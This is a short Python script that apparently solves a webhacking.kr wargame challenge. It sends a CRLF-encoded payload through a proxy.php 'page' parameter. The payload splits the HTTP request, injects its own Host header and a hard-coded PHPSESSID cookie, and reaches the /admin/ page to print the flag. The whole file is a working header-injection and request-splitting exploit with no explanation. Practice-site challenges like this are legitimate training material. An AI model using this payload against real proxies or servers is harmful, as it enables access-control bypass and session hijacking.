import requests

url = "http://webhacking.kr:10008/proxy.php?page="

def solve():
    payload = "/admin/%20HTTP/1.1%0d%0aHost:%20webhacking.kr:10008%0d%0aCookie:%20PHPSESSID=4pomle5mf9vt3o18c908l1kk1o%0d%0aConnection:%20Close%0d%0a%0d%0a"
    res = requests.get(url=url+payload)
    if "FLAG{" in res.text:
        print(res.text)

if __name__ == "__main__":
    solve()